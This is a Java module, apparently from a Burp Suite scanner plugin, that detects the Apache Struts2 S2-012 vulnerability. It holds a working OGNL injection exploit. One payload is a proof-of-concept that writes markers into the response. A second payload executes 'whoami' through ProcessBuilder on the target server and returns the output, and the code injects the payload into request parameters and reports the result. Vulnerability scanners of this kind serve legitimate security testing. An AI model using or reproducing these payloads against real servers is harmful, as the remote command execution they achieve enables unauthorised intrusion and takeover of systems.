package module.java.vul;

import burp.*;
import module.Util;

import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;

public class S2_012 extends IModule {
    public String poc =
        "%{" +
        "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
        "#f.getWriter().print(\"" + injectMark[0] + "\")," +
        "#f.getWriter().print(\"" + injectMark[1] + "\")," +
        "#f.getWriter().flush()," +
        "#f.getWriter().close()" +
        "}";
    public String exp =
        "%{" +
        "#a=(new java.lang.ProcessBuilder(\"whoami\")).redirectErrorStream(true).start()," +
        "#b=#a.getInputStream()," +
        "#c=new java.io.InputStreamReader(#b)," +
        "#d=new java.io.BufferedReader(#c)," +
        "#e=new char[50]," +
        "#d.read(#e)," +
        "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
        "#f.getWriter().println(new java.lang.String(#e))," +
        "#f.getWriter().flush()," +
        "#f.getWriter().close()" +
        "}";

    @Override
    public IScanIssue start() {
        byte[] response = iHttpRequestResponse.getResponse();
        IResponseInfo iResponseInfo = helpers.analyzeResponse(response);
        short statusCode = iResponseInfo.getStatusCode();

        if (statusCode == 302) {
            List<IParameter> parameters = requestInfo.getParameters();
            for (IParameter parameter: parameters) {
                if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                    IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(poc), parameter.getType());
                    request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                    if (check()) {
                        this.detail = URLEncoder.encode(exp);
                        return creatCustomScanIssue();
                    }
                }
            }
        }
        return null;
    }
}
